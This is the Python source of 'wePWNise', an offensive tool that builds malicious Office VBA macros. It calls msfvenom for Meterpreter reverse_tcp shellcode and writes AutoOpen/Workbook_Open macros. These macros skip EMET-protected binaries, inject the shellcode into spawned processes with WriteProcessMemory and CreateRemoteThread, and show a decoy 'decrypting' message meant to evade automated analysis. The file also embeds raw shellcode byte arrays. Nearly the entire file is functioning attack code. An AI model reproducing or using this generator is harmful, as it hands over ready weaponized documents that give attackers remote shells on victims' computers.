import time
import tempfile
import subprocess
import struct
import md5
import os
import sys
import argparse
from termcolor import colored

# Generate MSF list stream for
# msfvenom -p windows/x64/meterpreter/reverse_tcp
# and
# msfvenom -p windows/meterpreter/reverse_tcp
#
# Let user define 	--x64 -> x64 payload  	Default: windows/x64/meterpreter/reverse_tcp
# 			--x86 -> x86 payload	Default: windows/meterpreter/reverse_tcp
# 			lhost -> LHOST		No Default
#			lport -> LPORT		Default: 443
#			
#			--out -> OUTPUT file	Default: wepwnise.txt
#
# You can modify binary-paths.txt to have a list of your own choice :)
#
 
version = "0.25 BETA"

def printBanner():

    with open('banner.txt', 'r') as f:
        data = f.read()

	print colored(data,"red")
	print colored("Version %s" % version, "yellow")
	print colored("Author: Vincent Yiu (@vysec, @vysecurity)", "yellow")

def validateIP(ipaddr):
	vals=ipaddr.split(".")
	if len(vals) != 4:
		return False
	else:
		# At least we have 4 dots yeah
		for i in vals:
			try:
				val = int(i)
				if not(val >= 0 and val <= 255):
					return False
			except:
				return False
		return True

def validatePort(port):
	try:
		val = int(port)
		if not(val >= 0 and val <= 65535):
			return False
	except:
		return False
	return True

def validate64bitpayload(payload):
	f = open("payload-list.txt", "r")
	text = f.read().split("\n")
	for i in text:
		if (payload in text) and ("x64" in payload):
			return True
	return False

def validate32bitpayload(payload):
	f = open("payload-list.txt", "r")
	text = f.read().split("\n")
	for i in text:
		if (payload in text) and not ("x64" in payload):
			return True
		return False

def generateWPM(payload):
	a = "232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193,,207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,,0,104,119,115,50,95,84,104,76,119,38,7,255,213,184,144,1,0,0,41,,196,84,80,104,41,128,107,0,255,213,106,5,104,192,168,179,128,104,2,0,,1,187,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,,232,97,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213,131,248,,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,,34,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,,110,77,97,255,213,94,94,255,12,36,233,113,255,255,255,1,195,41,198,117,,199,195,187,240,181,162,86,106,0,83,255,213"
	a = a.split(",")

	pos = 0
	for i in a:
		print "rekt = WriteProcessMemory(hProcess, ByVal lLinkToLibrary + %s, %s, 1, b)" % (str(pos),str(i))
		pos += 1

printBanner()

print ""

parser = argparse.ArgumentParser(description="wePWNise")
parser.add_argument("--x64", dest="x64", default="windows/x64/meterpreter/reverse_tcp", help="msfvenom x64 payload")
parser.add_argument("--x86", dest="x86", default="windows/meterpreter/reverse_tcp", help="msfvenom x86 payload")
parser.add_argument("lhost64", help="LHOST for x64 to connect/bind to")
parser.add_argument("lhost86", help="LHOST for x86 to connect/bind to")
parser.add_argument("lport64", help="LPORT for x64 to connect/bind to")
parser.add_argument("lport86", help="LPORT for x86 to connect/bind to")
parser.add_argument("--out", default="wepwnise.txt", help="File to output the VBA macro to")
parser.add_argument("--msgbox", default=True, dest="msgbox", help="Present messagebox to prevent automated analysis")
parser.add_argument("--msg", default="This document will begin decrypting, please allow up to 5 minutes", dest="msg", 
help="The message to present the victim")

if len(sys.argv) <= 2:
	parser.print_help()
	print ""

args = parser.parse_args()

xlhost = False
xlport = False
x32bit = False
x64bit = False

if validateIP(args.lhost64):
	print colored("[+] LHOST X64: %s" % args.lhost64, "green")
	xlhost = True
else:
	print colored("[-] Incorrect LHOST X64: %s" % args.lhost64, "red")

if validateIP(args.lhost86):
        print colored("[+] LHOST X86: %s" % args.lhost86, "green")
        xlhost = True
else:
        print colored("[-] Incorrect LHOST X86: %s" % args.lhost86, "red")

if validatePort(args.lport64):
	print colored("[+] LPORT X64: %s" % args.lport64, "green")
	xlport = True
else:
	print colored("[-] Incorrect LPORT X64: %s" %args.lport64, "red")

if validatePort(args.lport86):
        print colored("[+] LPORT X86: %s" % args.lport86, "green")
        xlport = True
else:
        print colored("[-] Incorrect LPORT X86: %s" %args.lport86, "red")

if validate32bitpayload(args.x86):
	print colored("[+] X86 PAYLOAD: %s" % args.x86, "green")
	x32bit = True
else:
	print colored("[-] Incorrect X86 PAYLOAD: %s" % args.x86, "red")

if validate64bitpayload(args.x64):
	print colored("[+] X64 PAYLOAD: %s" % args.x64, "green")
	x64bit = True
else:
	print colored("[-] Incorrect X86 PAYLOAD: %s" % args.x64, "red")

# At this point we know that we have the correct LHOST and LPORT ready for smexiness
# We also validated our parameters to all be correct

if (not xlhost) or (not xlport) or (not x32bit) or (not x64bit):
	sys.exit("Invalid parameters, quitting")
	# Invalid, do not continue
print ""

print colored("[*] Welcome to wePWNise", "blue")

print ""
print colored("[+] Obtaining payloads", "green")
print colored("\t X86 PAYLOAD", "green")
pay86 = os.popen("msfvenom -p %s LHOST=%s LPORT=%s -f num" % (args.x86, args.lhost86, args.lport86)).read()
print colored("\t X64 PAYLOAD", "green")
pay64 = os.popen("msfvenom -p %s LHOST=%s LPORT=%s -f num" % (args.x64, args.lhost64, args.lport64)).read()
print colored("[+] Payloads obtained successfully", "green")
print colored("[+] Formatting payloads", "green")
pay86 = pay86.replace("\r\n", "").split(", ")
pay64 = pay64.replace("\r\n", "").split(", ")
print colored("[+] Formatting complete", "green")

lines1 = ["Private Const PROCESS_ALL_ACCESS = &H1F0FFF\r\n",
"Private Const MEM_COMMIT = &H1000\r\n",
"Private Const MEM_RELEASE = &H8000\r\n",
"Private Const PAGE_READWRITE = &H40\r\n",
"Private Const HKEY_LOCAL_MACHINE = &H80000002\r\n",
"Private Const PROCESSOR_ARCHITECTURE_AMD64 = 9\r\n",
"#If VBA7 Then 'x64 office\r\n",
"Private Declare PtrSafe Function VirtualAllocEx Lib \"kernel32\" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long\r\n",
"Private Declare PtrSafe Function VirtualFreeEx Lib \"kernel32\" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long\r\n",
"Private Declare PtrSafe Function OpenProcess Lib \"kernel32\" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long\r\n",
"Private Declare PtrSafe Function WriteProcessMemory Lib \"kernel32\" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long\r\n",
"Private Declare PtrSafe Function CreateRemoteThread Lib \"kernel32\" (ByVal hProcess As Long, lpThreadAttributes As Any, ByVal dwStackSize As Long, lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long\r\n",
"Private Declare PtrSafe Sub GetSystemInfo Lib \"kernel32\" (lpSystemInfo As SYSTEM_INFO)\r\n",
"Private Declare PtrSafe Function GetCurrentProcess Lib \"kernel32\" () As LongPtr\r\n",
"Private Declare PtrSafe Function IsWow64Process Lib \"kernel32\" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean\r\n",
"Private Declare PtrSafe Function CreateProcessA Lib \"kernel32\" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long\r\n",
"Type SYSTEM_INFO\r\n",
"wProcessorArchitecture As Integer\r\n",
"wReserved As Integer\r\n",
"dwPageSize As Long\r\n",
"lpMinimumApplicationAddress As LongPtr\r\n",
"lpMaximumApplicationAddress As LongPtr\r\n",
"dwActiveProcessorMask As LongPtr\r\n",
"dwNumberOrfProcessors As Long\r\n",
"dwProcessorType As Long\r\n",
"dwAllocationGranularity As Long\r\n",
"wProcessorLevel As Integer\r\n",
"wProcessorRevision As Integer\r\n",
"End Type\r\n",
"Type PROCESS_INFORMATION\r\n",
"hProcess As Long\r\n",
"hThread As Long\r\n",
"dwProcessId As Long\r\n",
"dwThreadId As Long\r\n",
"End Type\r\n",
"Type STARTUPINFO\r\n",
"cb As Long\r\n",
"lpReserved As String\r\n",
"lpDesktop As String\r\n",
"lpTitle As String\r\n",
"dwX As Long\r\n",
"dwY As Long\r\n",
"dwXSize As Long\r\n",
"dwYSize As Long\r\n",
"dwXCountChars As Long\r\n",
"dwYCountChars As Long\r\n",
"dwFillAttribute As Long\r\n",
"dwFlags As Long\r\n",
"wShowWindow As Integer\r\n",
"cbReserved2 As Integer\r\n",
"lpReserved2 As Long\r\n",
"hStdInput As Long\r\n",
"hStdOutput As Long\r\n",
"hStdError As Long\r\n",
"End Type\r\n",
"#Else\r\n",
"Private Declare Function VirtualAllocEx Lib \"kernel32\" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long\r\n",
"Private Declare Function VirtualFreeEx Lib \"kernel32\" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long\r\n",
"Private Declare Function OpenProcess Lib \"kernel32\" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long\r\n",
"Private Declare Function WriteProcessMemory Lib \"kernel32\" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long\r\n",
"Private Declare Function CreateRemoteThread Lib \"kernel32\" (ByVal hProcess As Long, lpThreadAttributes As Any, ByVal dwStackSize As Long, lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long\r\n",
"Private Declare Sub GetSystemInfo Lib \"kernel32\" (lpSystemInfo As SYSTEM_INFO)\r\n",
"Private Declare Function GetCurrentProcess Lib \"kernel32\" () As Long\r\n",
"Private Declare Function IsWow64Process Lib \"kernel32\" (ByVal hProcess As Long, ByRef Wow64Process As Boolean) As Boolean\r\n",
"Private Declare Function CreateProcessA Lib \"kernel32\" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long\r\n",
"Type SYSTEM_INFO\r\n",
"wProcessorArchitecture As Integer\r\n",
"wReserved As Integer\r\n",
"dwPageSize As Long\r\n",
"lpMinimumApplicationAddress As Long\r\n",
"lpMaximumApplicationAddress As Long\r\n",
"dwActiveProcessorMask As Long\r\n",
"dwNumberOrfProcessors As Long\r\n",
"dwProcessorType As Long\r\n",
"dwAllocationGranularity As Long\r\n",
"dwReserved As Long\r\n",
"End Type\r\n",
"Type PROCESS_INFORMATION\r\n",
"hProcess As Long\r\n",
"hThread As Long\r\n",
"dwProcessId As Long\r\n",
"dwThreadId As Long\r\n",
"End Type\r\n",
"Type STARTUPINFO\r\n",
"cb As Long\r\n",
"lpReserved As String\r\n",
"lpDesktop As String\r\n",
"lpTitle As String\r\n",
"dwX As Long\r\n",
"dwY As Long\r\n",
"dwXSize As Long\r\n",
"dwYSize As Long\r\n",
"dwXCountChars As Long\r\n",
"dwYCountChars As Long\r\n",
"dwFillAttribute As Long\r\n",
"dwFlags As Long\r\n",
"wShowWindow As Integer\r\n",
"cbReserved2 As Integer\r\n",
"lpReserved2 As Long\r\n",
"hStdInput As Long\r\n",
"hStdOutput As Long\r\n",
"hStdError As Long\r\n",
"End Type\r\n",
"#End If\r\n",

#IS OFFICE 64 bit
"Public Function IsOffice64Bit() As Boolean\r\n",
"Dim lpSystemInfo As SYSTEM_INFO\r\n",
"Call GetSystemInfo(lpSystemInfo)\r\n",
"If lpSystemInfo.wProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64 Then\r\n",
"Call IsWow64Process(GetCurrentProcess(), IsOffice64Bit)\r\n",
"IsOffice64Bit = Not IsOffice64Bit\r\n",
"End If\r\n",
"End Function\r\n",

#ISWOW64
"Public Function IsWow64(handle As Long) As Boolean\r\n",
"Call IsWow64Process(handle, meh)\r\n",
"IsWow64 = Not meh\r\n",
"End Function\r\n",
"Public Function DieTotal()\r\n"]

# Add MsgBox text

if args.msgbox == True:
	lines1 += [("MsgBox \"%s\"\r\n" % args.msg)]

lines1 += ["End Function\r\n",

# Directory Stuff

"Public Function TrailingSlash(strFolder As String) As String\r\n",
"If Len(strFolder) > 0 Then\r\n",
"If Right(strFolder, 1) = \"\\\" Then\r\n",
"TrailingSlash = strFolder\r\n",
"Else\r\n",
"TrailingSlash = strFolder & \"\\\"\r\n",
"End If\r\n",
"End If\r\n",
"End Function\r\n",
"Public Function RecursiveDir(colFiles As Collection, strFolder As String, strFileSpec As String, bIncludeSubfolders As Boolean)\r\n",
"Dim strTemp As String\r\n",
"Dim colFolders As New Collection\r\n",
"Dim vFolderName As Variant\r\n",
"strFolder = TrailingSlash(strFolder)\r\n",
"On Error Resume Next\r\n",
"strTemp = Dir(strFolder & strFileSpec)\r\n",
"Do While strTemp <> vbNullString\r\n",
"colFiles.Add strFolder & strTemp\r\n",
"strTemp = Dir\r\n",
"Loop\r\n",
"If bIncludeSubfolders Then\r\n",
"strTemp = Dir(strFolder, vbDirectory)\r\n",
"Do While strTemp <> vbNullString\r\n",
"If (strTemp <> \".\") And (strTemp <> \"..\") Then\r\n",
"If (GetAttr(strFolder & strTemp) And vbDirectory) <> 0 Then\r\n",
"colFolders.Add strTemp\r\n",
"End If\r\n",
"End If\r\n",
"strTemp = Dir\r\n",
"Loop\r\n",
"For Each vFolderName In colFolders\r\n",
"Call RecursiveDir(colFiles, strFolder & vFolderName, strFileSpec, True)\r\n",
"Next vFolderName\r\n",
"End If\r\n",
"End Function\r\n",



# GET LIST
"Public Function getList() As String()\r\n",
"Dim myList As String\r\n",
"myList = \"\"\r\n"]

# Add List of Binary Paths

f = open('binary-paths.txt', 'r')

binPaths = f.readlines()

for p in binPaths:
	q = p.replace("\n", "")
	lines1 += [("myList = myList & \"%s\" & \",\"\r\n" % q)]

f.close()

# Rest of GET LIST

lines1 += ["myArray = Split(myList, \",\")\r\n",
"Dim c As Integer\r\n",
"Dim list() As String\r\n",
"For c = LBound(myArray) To (UBound(myArray) - 1)\r\n",
"ReDim Preserve list(c)\r\n",
"list(c) = myArray(c)\r\n",
"Next\r\n",
"c = UBound(list)\r\n",
"Dim colFiles As New Collection\r\n"]


f = open('directory-paths.txt','r')

dirPaths = f.readlines()

for p in dirPaths:
	q = p.replace("\n", "")
	lines1 += [("RecursiveDir colFiles, \"%s\", \"*.exe\", True\r\n" % q)]

lines1 +=  ["Dim vFile As Variant\r\n",
"For Each vFile In colFiles\r\n",
"ReDim Preserve list(c)\r\n",
"list(c) = vFile\r\n",
"c = c + 1\r\n",
"Next vFile\r\n",
"getList = list\r\n",
"End Function\r\n",
# PATH OF

"Public Function pathOf(program As String) As String\r\n",
"pathOf = \"\"\r\n",
"If program Like \"*.exe\" Then\r\n",
"program = program\r\n",
"Else\r\n",
"program = program & \".exe\"\r\n",
"End If\r\n",
"If program Like \"*:\\*\" Then\r\n",
"pathOf = program\r\n",
"Exit Function\r\n",
"Else\r\n",
"paths = Environ(\"PATH\")\r\n",
"Dim allPaths() As String\r\n",
"allPaths = Split(paths, \";\")\r\n",
"For Each Path In allPaths\r\n",
"ms = Path & \"\\\" & program\r\n",
"If Not Dir(ms, vbDirectory) = vbNullString Then\r\n",
"pathOf = ms\r\n",
"Exit Function\r\n",
"End If\r\n",
"Next\r\n",
"End If\r\n",
"End Function\r\n",

#GET EMET
"Public Function getEMET() As String()\r\n",
"Set objShell = CreateObject(\"WScript.Shell\")\r\n",
"Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\r\n",
"Set oReg = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\" & \".\" & \"\\root\\default:StdRegProv\")\r\n",
"oReg.EnumValues HKEY_LOCAL_MACHINE, \"SOFTWARE\\Microsoft\\EMET\\AppSettings\", arrValues, arrTypes\r\n",
"Dim smack() As String\r\n",
"Dim count As Integer\r\n",
"For count = LBound(arrValues) To UBound(arrValues)\r\n",
"ReDim Preserve smack(count)\r\n",
"smack(count) = arrValues(count)\r\n",
"Next\r\n",
"getEMET = smack\r\n",
"End Function\r\n",


# AUTOPWN
"Public Function AutoPwn() As Long\r\n",
"myArray = FightEMET\r\n",
"Dim Count As Integer\r\n",
"Dim Success As Integer\r\n",
"For Count = LBound(myArray) To UBound(myArray)\r\n",
"Dim proc As String\r\n",
"proc = myArray(Count)\r\n",
"Success = Inject(proc)\r\n",
"If Success = 1 Then Exit For\r\n",
"Next\r\n",
"End Function\r\n",

# FIGHT EMET
"Public Function FightEMET() As String()\r\n",
"myArray = getList\r\n",
"smex = getEMET\r\n",
"Dim count As Integer\r\n",
"Dim sCount As Integer\r\n",
"Dim kCount As Integer\r\n",
"kCount = 0\r\n",
"Dim killedEMET() As String\r\n",
"For count = LBound(myArray) To UBound(myArray)\r\n",
"progo = myArray(count)\r\n",
"prog = Split(progo, \" \")\r\n",
"kk = Replace(prog(0), \"\\\\\", \"\\\")\r\n",
"Dim gg As String\r\n",
"gg = kk\r\n",
"pathKK = Replace(pathOf(Replace(gg, \"\"\"\", \"\")), \"\\\\\", \"\\\")\r\n",
"Dim fudgeBool As Boolean\r\n",
"fudgeBool = False\r\n",
"For sCount = LBound(smex) To UBound(smex)\r\n",
"    If LCase(pathKK) Like LCase(smex(sCount)) Then\r\n",
"        fudgeBool = True\r\n",
"    End If\r\n",
"Next\r\n",
"If fudgeBool = False Then\r\n",
"        ReDim Preserve killedEMET(kCount)\r\n",
"        killedEMET(kCount) = myArray(count)\r\n",
"        kCount = kCount + 1\r\n",
"End If\r\n",
"Next\r\n",
"FightEMET = killedEMET\r\n",
"End Function\r\n",

#FIGHT EMET END

"Public Function Inject(processCmd As String) As Long\r\n",
"Dim hProcess&, hThread&, lLinkToLibrary&, lSize&, hKernel&\r\n",
"Dim pInfo As PROCESS_INFORMATION\r\n",
"Dim sInfo As STARTUPINFO\r\n",
"Dim sNull As String\r\n",
"Dim sProc As String\r\n",
"sInfo.dwFlags = 1\r\n",
"If IsOffice64Bit Then\r\n",
"On Error Resume Next\r\n",
"sProc = processCmd\r\n",
"res = CreateProcessA(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)\r\n",
"hProcess = pInfo.hProcess\r\n",
"Dim b64 As Boolean\r\n",
"b64 = False\r\n",
"b64 = IsWow64(hProcess)\r\n",
"If b64 = True Then\r\n",
"If hProcess = 0 Then\r\n",
"Exit Function\r\n",
"End If\r\n",
"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, 1024, &H3000, PAGE_READWRITE)\r\n",
"If lLinkToLibrary = 0 Then\r\n",
"Exit Function\r\n",
"End If      \r\n",
"Position = lLinkToLibrary\r\n"]


#buf = Array(72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
#11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, _
#224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, 208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, _
#224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 73, 190, 119, 115, 50, 95, 51, 50, 0, 0, 65, 86, 73, 137, 230, 72, 129, 236, 160, 1, 0, 0, 73, 137, 229, 73, 188, 2, 0, 1, 187, 192, 168, 32, 129, 65, 84, 73, 137, 228, 76, 137, 241, 65, 186, 76, 119, 38, 7, 255, 213, 76, 137, 234, 104, 1, 1, 0, 0, 89, 65, 186, 41, 128, 107, 0, _
#255, 213, 106, 5, 65, 94, 80, 80, 77, 49, 201, 77, 49, 192, 72, 255, 192, 72, 137, 194, 72, 255, 192, 72, 137, 193, 65, 186, 234, 15, 223, 224, 255, 213, 72, 137, 199, 106, 16, 65, 88, 76, 137, 226, 72, 137, 249, 65, 186, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 73, 255, 206, 117, 229, 232, 147, 0, 0, 0, 72, 131, 236, 16, 72, 137, 226, 77, 49, 201, 106, 4, 65, 88, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 85, 72, 131, 196, 32, 94, 137, 246, 106, 64, 65, 89, 104, 0, 16, 0, 0, 65, 88, 72, 137, 242, 72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 137, 195, 73, 137, 199, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, 88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 60, 255, 255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 73, 199, 194, 240, 181, 162, 86, 255, 213)

lines1 += ["buf = Array("]
length = len(pay64)-1
total = 0

# Insert 64 bit payload into position
lCount = 0
for i in pay64:
	if (total != length):
		if (lCount < 100):
			lines1 += ["%s," % str(int(i,16))]
		else:
			lines1 += ["%s, _\r\n" % (str(int(i,16)))]
			lCount = 0
	else:
		lines1 += ["%s)\r\n" % (str(int(i,16)))]

	lCount += 1
	total += 1


#Injection loop
lines1 += ["Dim myCount As Integer\r\n",
"For myCount = LBound(buf) To UBound(buf)\r\n",
"Dim myByte As Byte\r\n",
"myByte = buf(myCount)\r\n",
"rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)\r\n",
"Next myCount\r\n"]
 

lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)\r\n",
"If hThread = 0 Then\r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Exit Function\r\n",
"End If\r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Inject = 1 'Success\r\n",
"Else\r\n",
"If hProcess = 0 Then\r\n",
"Exit Function\r\n",
"End If\r\n",
"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, 1024, &H3000, PAGE_READWRITE)\r\n",
"If lLinkToLibrary = 0 Then\r\n",
"Exit Function\r\n",
"End If\r\n",
"Position = lLinkToLibrary\r\n"]

# Insert 32 bit payload into position

lines1 += ["buf = Array("]
length = len(pay86)-1
total = 0

lCount = 0
for i in pay86:
	if (total != length):
		if (lCount < 100):
			lines1 += ["%s," % str(int(i,16))]
		else:
			lines1 += ["%s, _\r\n" % (str(int(i,16)))]
			lCount = 0
	else:
		lines1 += ["%s)\r\n" % (str(int(i,16)))]

	lCount += 1
	total += 1


#Injection loop
lines1 += ["For myCount = LBound(buf) To UBound(buf)\r\n",
"myByte = buf(myCount)\r\n",
"rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)\r\n",
"Next myCount\r\n"]

lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)\r\n",
"If hThread = 0 Then\r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Exit Function\r\n",
"End If    \r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Inject = 1 'Success\r\n",
"End If\r\n",
"Else\r\n",
"sProc = processCmd\r\n",
"res = CreateProcessA(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)\r\n",
"hProcess = pInfo.hProcess\r\n",
"If hProcess = 0 Then\r\n",
"Exit Function\r\n",
"End If\r\n",
"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, 1024, &H3000, PAGE_READWRITE)\r\n",
"If lLinkToLibrary = 0 Then\r\n",
"Exit Function\r\n",
"End If         \r\n",
"Position = lLinkToLibrary\r\n"]

# Insert 32 bit payload into position

lines1 += ["buf = Array("]
length = len(pay86)-1
total = 0

lCount = 0
for i in pay86:
	if (total != length):
		if (lCount < 100):
			lines1 += ["%s," % str(int(i,16))]
		else:
			lines1 += ["%s, _\r\n" % (str(int(i,16)))]
			lCount = 0
	else:
		lines1 += ["%s)\r\n" % (str(int(i,16)))]

	lCount += 1
	total += 1


#Injection loop
lines1 += ["For myCount = LBound(buf) To UBound(buf)\r\n",
"myByte = buf(myCount)\r\n",
"rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)\r\n",
"Next myCount\r\n"]

lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)\r\n",
"If hThread = 0 Then\r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Exit Function\r\n",
"End If\r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Inject = 1\r\n",
"End If\r\n",
"End Function\r\n",
"Sub AutoOpen()\r\n",
"DieTotal\r\n",
"AutoPwn\r\n",
"End Sub\r\n",
"Sub Workbook_Open()\r\n",
"DieTotal\r\n",
"AutoPwn\r\n",
"End Sub\r\n"]

# Open and write to text file

print colored("[+] Begin writing payload to: %s" % args.out, "green")

f = open(args.out, 'w+')

f.writelines(lines1)

f.close()

print colored("[+] Payload written","green")

print ""

print colored("[*] Please start up your x64 listener on %s:%s" % (args.lhost64,args.lport64), "blue")
print colored("[*] Please start up your x86 listener on %s:%s" % (args.lhost86,args.lport86), "blue")

print ""
